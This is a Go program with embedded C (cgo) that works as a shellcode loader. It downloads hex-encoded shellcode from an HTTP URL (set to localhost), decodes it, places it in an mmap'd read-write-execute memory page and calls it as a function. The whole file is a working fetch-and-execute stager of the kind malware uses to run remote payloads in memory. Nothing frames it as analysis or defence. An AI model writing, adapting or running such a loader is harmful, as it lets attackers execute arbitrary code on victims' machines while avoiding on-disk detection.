package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

void execute_shellcode(const char* shellcode, size_t size) {
    // 1. Allocate a local RWX memory page via native C mmap
    void* ptr = mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED) {
        return;
    }

    // 2. Copy the shellcode into the RWX page
    memcpy(ptr, shellcode, size);

    // 3. Cast the pointer to a standard C function pointer and call it
    void (*func)() = ptr;
    func();
}
*/
import "C"

import (
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

func main() {
	url := "http://localhost:80/shell_hex"
	fmt.Printf("[+] Fetching shellcode from %s ...\n", url)
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("[-] HTTP Request failed. Error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Fatalf("[-] Unexpected HTTP Status: %d", resp.StatusCode)
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("[-] Failed to read response body: %v", err)
	}

	code_hex := strings.TrimSpace(string(bodyBytes))
	fmt.Printf("Shell code hex is: %s\n", code_hex)

	// Clean up formatting
	code_hex = strings.ReplaceAll(code_hex, "0x", "")
	code_hex = strings.ReplaceAll(code_hex, ",", "")
	code_hex = strings.ReplaceAll(code_hex, "\\x", "")
	code_hex = strings.ReplaceAll(code_hex, "\n", "")
	code_hex = strings.ReplaceAll(code_hex, " ", "")

	shellcode, err := hex.DecodeString(code_hex)
	if err != nil {
		log.Fatalf("Failed to decode shellcode : %v", err)
	}
	fmt.Printf("Shellcode is decoded. Byte Length: %d\n", len(shellcode))

	// ---- CGO FIX APPLIED HERE ----
	fmt.Println("[+] Handing over execution context to CGO...")

	// Convert Go slice to a C-managed pointer and execute it
	cBytes := C.CBytes(shellcode)
	C.execute_shellcode((*C.char)(cBytes), C.size_t(len(shellcode)))
}
